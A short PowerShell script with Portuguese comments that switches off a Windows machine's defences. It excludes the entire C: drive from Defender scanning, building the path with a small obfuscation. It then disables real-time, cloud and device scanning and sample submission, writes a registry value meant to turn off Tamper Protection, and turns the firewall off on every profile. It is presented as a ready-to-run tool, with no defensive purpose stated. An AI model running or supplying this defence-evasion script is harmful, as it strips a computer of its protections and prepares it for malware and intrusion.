<#
.SYNOPSIS
    Desativa todas as proteções do Windows Defender + Firewall + Exclusão C:\.
.NOTES
    Execute como Administrador.
#>

#Requires -RunAsAdministrator

Write-Host "[*] Iniciando desativação total das defesas..." -ForegroundColor Cyan

# ---------- 1. Exclusão do disco C ----------
Write-Host "[1] Adicionando exclusão do C:\..."
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue
Write-Host "    Caminho excluído: $drive"

# ---------- 2. Proteção em tempo real ----------
Write-Host "[2] Desativando proteção em tempo real..."
Set-MpPreference -DisableRealtimeMonitoring $true
Write-Host "    Desativada."

# ---------- 3. Proteção fornecida na nuvem (MAPS + Bloqueio à primeira vista) ----------
Write-Host "[3] Desativando proteção na nuvem..."
Set-MpPreference -MAPSReporting 0               # 0 = Desabilitado (sem envio, sem nuvem)
Set-MpPreference -DisableBlockAtFirstSeen $true # Desabilita bloqueio imediato (primeira vista)
Write-Host "    Proteção na nuvem desativada."

# ---------- 4. Envio automático de amostras ----------
Write-Host "[4] Desativando envio automático de amostras..."
Set-MpPreference -SubmitSamplesConsent 2         # 2 = Never send
Write-Host "    Envio desativado."

# ---------- 5. Proteção contra violações (Tamper Protection) ----------
Write-Host "[5] Desativando proteção contra violações (via registro)..."
$tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
New-Item -Path $tamperPath -Force | Out-Null
Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -Type DWord -Force
Write-Host "    Registro alterado (0 = desativado). Pode exigir reboot."

# ---------- 6. Proteção de unidade/dispositivos (IOAV) ----------
Write-Host "[6] Desativando verificação de dispositivos..."
Set-MpPreference -DisableIOAVProtection $true
Write-Host "    Verificação de dispositivos desativada."

# ---------- 7. Firewall ----------
Write-Host "[7] Desligando Firewall do Windows..."
netsh advfirewall set allprofiles state off > $null
Write-Host "    Firewall desativado em todos os perfis."

Write-Host "[+] Todas as defesas foram desativadas com sucesso." -ForegroundColor Green
